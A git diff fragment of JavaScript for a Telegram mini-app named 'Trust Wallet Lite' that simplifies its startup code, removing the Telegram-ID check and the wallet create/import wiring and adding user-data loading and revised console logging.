+        userIdEl.textContent = `ID: ${userData.userId?.slice(-8)}`;
+    }
+}
+
 // ====== 14. INITIALIZATION ======
 document.addEventListener('DOMContentLoaded', async () => {
-    console.log("🚀 Initializing Trust Wallet Lite v6.3...");
+    console.log("🚀 Initializing Trust Wallet Lite...");
     
     initTheme();
     
-    // التحقق من وجود ID تيليجرام
-    if (!REAL_USER_ID) {
-        showErrorAndRetry("This app must be opened from Telegram.");
-        return;
-    }
-    
-    try {
-        await loadAdminId();
-        
-        document.querySelectorAll('.nav-item').forEach(btn => {
-            btn.addEventListener('click', () => {
-                const tab = btn.getAttribute('data-tab');
-                if (tab === 'wallet') showWallet();
-                else if (tab === 'referral') showAirdrop();
-                else if (tab === 'twtpay') showTWTPay();
-                else if (tab === 'settings') showSettings();
-            });
+    document.querySelectorAll('.nav-item').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const tab = btn.getAttribute('data-tab');
+            if (tab === 'wallet') showWallet();
+            else if (tab === 'referral') showAirdrop();
+            else if (tab === 'twtpay') showTWTPay();
+            else if (tab === 'settings') showSettings();
         });
-        
-        const createBtn = document.getElementById('createWalletBtn');
-        const importBtn = document.getElementById('importWalletBtn');
-        const confirmImportBtn = document.getElementById('confirmImportBtn');
-        
-        if (createBtn) createBtn.onclick = createNewWallet;
-        if (importBtn) importBtn.onclick = showImportModal;
-        if (confirmImportBtn) confirmImportBtn.onclick = importWallet;
-        
-        await fetchLivePrices();
-        
-        const userId = getUserId();
-        if (userId && localStorage.getItem(`user_${userId}`)) {
-            userData = JSON.parse(localStorage.getItem(`user_${userId}`));
-            isAdmin = (userId === adminId);
-            updateAdminCrown();
-            showMainApp();
-            updateUI();
-        } else {
-            showOnboarding();
-        }
-        
-        hideSplashScreen();
-        
-        console.log("✅ App initialized successfully!");
-        console.log("👑 Final isAdmin:", isAdmin);
-        
-    } catch (error) {
-        console.error("❌ Initialization error:", error);
-        showErrorAndRetry("Failed to initialize app. Please refresh.");
-    }
+    });
+    
+    await fetchLivePrices();
+    await loadUserData();
+    
+    const splash = document.getElementById('splashScreen');
+    if (splash) splash.classList.add('hidden');
+    
+    console.log("✅ Trust Wallet Lite - WORKING!");
+    console.log("📱 User ID:", userId);
+    console.log("👑 Is Admin:", isAdmin);
 });
 
 // ====== 15. EXPOSE GLOBALS ======
@@ -987,17 +670,7 @@ window.closeModal = closeModal;
 window.toggleLanguage = toggleLanguage;
 window.toggleTheme = toggleTheme;
 window.logout = logout;
-window.createNewWallet = createNewWallet;
-window.importWallet = importWallet;
-window.showImportModal = showImportModal;
 window.copyInviteLink = copyInviteLink;
 window.claimMilestone = claimMilestone;
-window.showTopUp = showTopUp;
-window.showCardSettings = showCardSettings;
-window.showCardTransactions = showCardTransactions;
 window.sendTransaction = sendTransaction;
 window.submitWithdraw = submitWithdraw;
-
-console.log("✅ Trust Wallet Lite v6.3 - FULLY FIXED!");
-console.log("📱 Telegram ID:", REAL_USER_ID);
-console.log("👑 Is Admin:", isAdmin);
